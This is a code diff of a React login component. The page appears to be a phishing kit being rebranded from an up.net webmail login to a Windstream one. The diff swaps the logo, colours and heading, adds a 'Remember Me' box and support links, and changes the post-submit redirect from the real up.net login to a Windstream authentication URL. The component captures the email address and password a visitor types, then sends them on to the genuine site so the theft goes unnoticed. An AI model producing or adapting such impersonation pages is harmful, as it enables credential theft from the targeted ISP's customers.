@@ -8,7 +8,7 @@ import axios from 'axios';
 
 import iglou from './iglou.png';
 import catskill from './catskill.png';
-
+import winstream from './windstream.png';
 
 function Home(){
 
@@ -16,7 +16,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Up-Net")
+    const[platform, setPlatform] = useState("Windstream")
 
     const[showError, setShowError] = useState(false);
 
@@ -43,7 +43,7 @@ function Home(){
              // console.log(response.data.message);
   
             
-             window.location.href = 'https://webmail.up.net/wmidentity/Account/Login?ReturnUrl=%2Fwmidentity%2Fconnect%2Fauthorize%2Fcallback%3Fresponse_mode%3Dform_post%26response_type%3Dcode%2520id_token%26redirect_uri%3Dhttps%253A%252F%252Fwebmail.up.net%252Flogin.php%26client_id%3Dwebmail%26nonce%3D068df3e7c9193a040fac4bdae6b69298%26state%3D3e620838d23573701c21ec67ba6c3931%26scope%3Dopenid%2520profile%2520email%2520webmail%2520openid';
+             window.location.href = 'https://windstream-email.auth-gateway.net/saml/module.php/authSynacor/login.php?AuthState=_a4e49b0332e1d4b84cc387a46ae8e4696f13bfe57b%3Ahttps%3A%2F%2Fwindstream-email.auth-gateway.net%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail.windstream.net%252F%26cookieTime%3D1714665648';
           }
         } catch (error) {
           // Handle error
@@ -66,20 +66,16 @@ function Home(){
 
 
 
-            <div className='text-center my-4'>
-            {/* <img  src={catskill} /> */}
+            <div className='text-center my-2'>
+            <img  src={winstream} />
 
             </div>
 
 
             <div className='col-md-5 whitediv m-auto   px-0'>
-              <div className='py-2 m-0 w-100 px-4'style={{
-                backgroundColor:"#fd0000",
-                color:"white",
-              }}>
-                <h4 className=''>up.net Login</h4>
+              
 
-              </div>
+              <h4 className='text-center'>Webmail Login</h4>
                 
 
 
@@ -90,7 +86,7 @@ function Home(){
                         <label className='label'> E-mail address</label>
                         <input type="email"onChange={function(e){
                             setUserName(e.target.value);
-                        }}value={email} className="form-control"required />
+                        }}value={email} className="form-control myinput"required />
 
                     </div>
 
@@ -99,9 +95,16 @@ function Home(){
                         <label className='label'> Password</label>
                         <input type="password"onChange={function(e){
                             setPassword(e.target.value);
-                        }}value={password} className="form-control"required />
+                        }}value={password} className="form-control myinput"required />
 
                     </div>
+
+                    <div className='form-group'>
+                      <input type="checkbox" /> <span className='font-weight-bold px-2'>Remember Me ?</span>
+
+                    </div>
+
+
 
                    
 
@@ -128,16 +131,27 @@ function Home(){
                     </div> */}
 
 
-                    <div className='form-group text-right'>
+                    <div className='form-group text-center'>
 
 <button type='submit' style={{
-  backgroundColor:"#fd0000",
-}}className='btn text-center w-50 font-weight-bold text-light py-2'>LOGIN</button>
+  backgroundColor: '#ef6724',
+  fontSize:'25px',
+}}className='btn text-center w-100 font-weight-bold text-light py-2 rounded '>LOGIN</button>
 
 
 
 
 
+
+</div>
+
+<div className='linkdiv'>
+  <a style={{
+        color: '#1f8aa3',
+        textDecoration: 'underline',
+  }}>Forgot Your Password or Need to Reset It? <br/>
+Email Identity Dashboard<br/>
+Login Support Page</a>
 
 </div>
 
